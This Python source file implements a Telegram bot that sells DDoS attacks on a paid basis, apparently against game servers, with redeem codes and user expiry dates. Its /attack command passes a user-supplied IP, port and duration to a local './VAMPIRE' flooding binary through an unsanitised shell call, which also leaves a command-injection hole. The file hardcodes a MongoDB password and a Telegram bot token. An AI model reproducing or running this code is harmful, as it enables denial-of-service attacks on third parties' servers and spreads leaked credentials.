
import asyncio
import random
import string
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['VAMPIREXCHEATS']
redeem_codes_collection = db['redeem_codes0']

TELEGRAM_BOT_TOKEN = '7715609687:AAGNIrmJ1QgpsFWHqLuXG31ZuRGmfV3UEFM'
ADMIN_USER_ID = 7442822303  

cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*⚡ /start* - Start interacting with the bot.\n"
            "*⚡ /attack* - Trigger an attack operation.\n"
            "*⚡ /redeem* - Redeem a code.\n"
            "*⚡ /get_id* - Get Your Id?.\n"
        )
    else:
        help_text = (
            "*☄️ Available Commands for Admins:*\n\n"
            "*⚡ /start* - Start the bot.\n"
            "*⚡ /attack* - Start the attack.\n"
            "*⚡ /get_id* - Get user id.\n"
            "*⚡ /remove [user_id]* - Remove a user.\n"
            "*⚡ /users* - List all allowed users.\n"
            "*⚡ /gen* - Generate a redeem code.\n"
            "*⚡ /redeem* - Redeem a code.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
    
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  
    user_name = update.effective_user.first_name  
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! /get_id*", parse_mode='Markdown')
        return
    message = (
       "*🚀ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ıllıllı ƔαɱקIııƦǝ ɱσ∂ χ DɗoS̴ S̴ǝƦƔǝƦ ıllıllı 🚀*\n\n"
        "*💀Use /attack <ip> <port> <duration>*\n"
        "*💀ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @DEMON_ROCKY 🚀*" 
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return
    cooldown_period = 60
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ Wait for Attack finish {remaining_time}*",
                parse_mode='Markdown'
            )
            return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
        return
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    await context.bot.send_message(
    chat_id=chat_id,
    text=(
        f"*💀 ⚠️𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀𝘿!❗ 💀*\n"
        f"💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇꜰᴇᴇᴄᴛ!* 💢\n\n"
        f"*🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n"
        f"*⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {duration} seconds*\n"
        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @vampirexcheats💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f"YOUR USER ID: `{user_id}`" 
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./VAMPIRE {ip} {port} {duration} 1024 400 ",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return
    if time_input[-1].lower() == 'd':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day"
    elif time_input[-1].lower() == 'm':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [], 
        "max_uses": max_uses,
        "redeem_count": 0
    })
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 User List:\n" 
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False      
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("get_id", VAMPIREXCHEATS))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))
    
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
